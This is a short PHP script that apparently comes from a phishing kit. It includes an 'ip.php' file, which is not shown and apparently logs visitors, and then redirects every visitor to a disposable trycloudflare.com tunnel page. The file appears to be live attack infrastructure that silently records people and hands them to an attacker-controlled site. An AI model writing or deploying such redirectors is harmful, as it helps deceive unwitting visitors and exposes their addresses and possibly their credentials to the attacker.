<?php
include 'ip.php';
header('Location: https://horror-twin-disks-ev.trycloudflare.com/index.html');
exit
?>
